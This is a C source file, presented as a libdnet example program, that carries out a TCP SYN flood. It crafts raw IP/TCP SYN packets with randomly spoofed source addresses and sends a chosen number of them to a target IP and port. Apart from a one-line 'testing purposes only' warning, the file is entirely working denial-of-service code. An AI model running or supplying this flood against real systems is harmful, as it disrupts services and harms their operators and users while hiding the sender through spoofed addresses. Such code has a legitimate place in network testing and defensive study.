/*
 * libdnet Windows TCP SYN Flood Example
 *
 * Features: Send multiple TCP SYN packets with random source IPs
 *
 * Compile:
 * gcc -I../include -L../src/.libs -o tcp_syn_flood.exe tcp_syn_flood.c -ldnet -lws2_32 -liphlpapi
 *
 * Run (requires administrator privileges):
 * tcp_syn_flood.exe <dst_ip> <dst_port> <count>
 *
 * Example:
 * tcp_syn_flood.exe 192.168.1.100 80 50
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#include "dnet.h"

static uint16_t
in_cksum(const u_char *buf, size_t len)
{
    const u_short *w = (const u_short *)buf;
    uint32_t sum = 0;
    int nleft = (int)len;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(u_char *)(&sum) = *(const u_char *)w;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

int main(int argc, char *argv[])
{
    ip_t *ip;
    struct addr dst;
    u_char pkt[1500];
    struct ip_hdr *iph;
    struct tcp_hdr *tcph;
    uint16_t dst_port, src_port;
    int count, i;
    uint32_t src_ip;

    if (argc < 4) {
        fprintf(stderr, "Usage: %s <dst_ip> <dst_port> <count>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.100 80 50\n", argv[0]);
        return 1;
    }

    if (addr_aton(argv[1], &dst) < 0) {
        fprintf(stderr, "Error: invalid IP address: %s\n", argv[1]);
        return 1;
    }

    dst_port = atoi(argv[2]);
    count = atoi(argv[3]);

    srand((unsigned int)time(NULL));

    printf("=== libdnet TCP SYN Flood Example ===\n");
    printf("Target: %s:%d\n", addr_ntoa(&dst), dst_port);
    printf("Packet count: %d\n\n", count);
    printf("WARNING: This is for testing purposes only!\n\n");

    if ((ip = ip_open()) == NULL) {
        fprintf(stderr, "Error: unable to open IP interface (requires admin privileges)\n");
        return 1;
    }

    memset(pkt, 0, sizeof(pkt));
    iph = (struct ip_hdr *)pkt;
    tcph = (struct tcp_hdr *)(pkt + 20);

    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = htons(40);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = IP_PROTO_TCP;
    iph->ip_sum = 0;
    memcpy(&iph->ip_dst, &dst.addr_ip, 4);

    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(65535);
    tcph->th_sum = 0;
    tcph->th_urp = 0;

    printf("Sending TCP SYN packets...\n");
    for (i = 0; i < count; i++) {
        src_ip = rand();
        src_port = (uint16_t)(rand() % 60000 + 1024);

        memcpy(&iph->ip_src, &src_ip, 4);
        iph->ip_id = htons(i);

        tcph->th_sport = htons(src_port);
        tcph->th_dport = htons(dst_port);
        tcph->th_seq = htonl(rand());

        iph->ip_sum = in_cksum(pkt, 20);

        if (ip_send(ip, pkt, 40) < 0) {
            printf("Packet %d: send failed\n", i + 1);
        } else {
            if ((i + 1) % 10 == 0 || i == count - 1) {
                printf("Sent %d/%d SYN packets...\n", i + 1, count);
            }
        }
    }

    printf("[OK] TCP SYN flood completed\n");
    ip_close(ip);
    printf("\n=== Done ===\n");
    return 0;
}
